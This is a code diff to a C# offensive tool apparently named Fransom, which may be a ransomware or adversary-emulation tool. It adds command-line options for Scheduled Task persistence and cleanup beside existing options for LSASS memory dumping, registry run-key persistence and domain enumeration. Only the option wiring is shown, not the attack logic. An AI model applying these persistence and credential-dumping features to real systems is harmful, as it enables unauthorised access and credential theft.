@@ -67,8 +67,12 @@ namespace Fransom
             public bool DumpLsass { get; set; }
             [Option("userregkey", HelpText = "Persistence via registry run key.", Group = "arguments")]
             public bool UserRegKey { get; set; }
-            [Option("userregkey-clean", HelpText = "Clear registry peristence.", Group = "arguments")]
+            [Option("userregkey-clean", HelpText = "Clear registry persistence.", Group = "arguments")]
             public bool UserRegKeyClear { get; set; }
+            [Option("scheduled-task", HelpText = "Persistence via new Scheduled Task.", Group = "arguments")]
+            public bool ScheduledTask { get; set; }
+            [Option("scheduled-task-clean", HelpText = "Clean Scheduled Task persistence.", Group = "arguments")]
+            public bool ScheduledTaskClean { get; set; }
             [Option("ps", HelpText = "Helper: List running processes.", Group = "arguments")]
             public bool ListProcesses { get; set; }
             [Option("domain-users", HelpText = "List domain users.", Group = "arguments")]
@@ -110,6 +114,8 @@ namespace Fransom
             Logger.WriteLine("dump-lsass\t\t\t\tDump LSASS process memory.");
             Logger.WriteLine("userregkey\t\t\t\tPersistence via registry run key.");
             Logger.WriteLine("userregkey-clean\t\t\tClear registry peristence.");
+            Logger.WriteLine("scheduled-task\t\t\t\tPersistence via new Scheduled Task.");
+            Logger.WriteLine("scheduled-task-clean\t\t\t\tClean Scheduled Task persistence.");
             Logger.WriteLine("ps\t\t\t\t\tList running processes.");
             Logger.WriteLine("domain-users\t\t\t\tList domain users.");
             Logger.WriteLine("domain-groups\t\t\t\tList domain groups.");
@@ -234,6 +240,16 @@ namespace Fransom
             {
                 var p = new Persistence();
                 p.CleanupUserRegKey();
+            }
+            if (options.ScheduledTask)
+            {
+                var p = new Persistence();
+                p.CreateScheduledTask();
+            }
+            if (options.ScheduledTaskClean)
+            {
+                var p = new Persistence();
+                p.RemoveScheduledTask();
             }
             if (options.DumpLsass)
             {
@@ -392,6 +408,12 @@ namespace Fransom
                         break;
                     case "userregkey-clean":
                         p.CleanupUserRegKey();
+                        break;
+                    case "scheduled-task":
+                        p.CreateScheduledTask();
+                        break;
+                    case "scheduled-task-clean":
+                        p.RemoveScheduledTask();
                         break;
                     case "ps":
                         e.EnumerateProcesses();
@@ -747,7 +769,7 @@ namespace Fransom
                 {
                     File.SetAttributes(file, FileAttributes.Normal);
                     File.Delete(file);
-                } 
+                }
                 catch (Exception e)
                 {
                     Logger.WriteLine("[-] Error: " + e.Message);
